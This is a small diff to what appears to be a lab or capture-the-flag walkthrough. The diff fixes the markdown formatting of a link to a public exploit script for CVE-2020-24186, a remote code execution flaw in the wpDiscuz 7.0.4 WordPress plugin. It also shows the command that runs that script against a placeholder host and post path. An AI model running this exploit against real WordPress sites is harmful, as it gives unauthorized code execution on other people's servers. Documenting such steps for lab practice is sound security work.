@@ -40,7 +40,9 @@ set LHOST  <IP Localhost HOST>
 
 ## Option B - Using a python script
 
-We will be using this (script)[https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/tree/main]
+
+
+We will be using this [script](https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/tree/main)
 
 `python wpDiscuz_RemoteCodeExec.py -u http://<IP HOST>:8080/ -p /2025/01/20/fake2/`
 
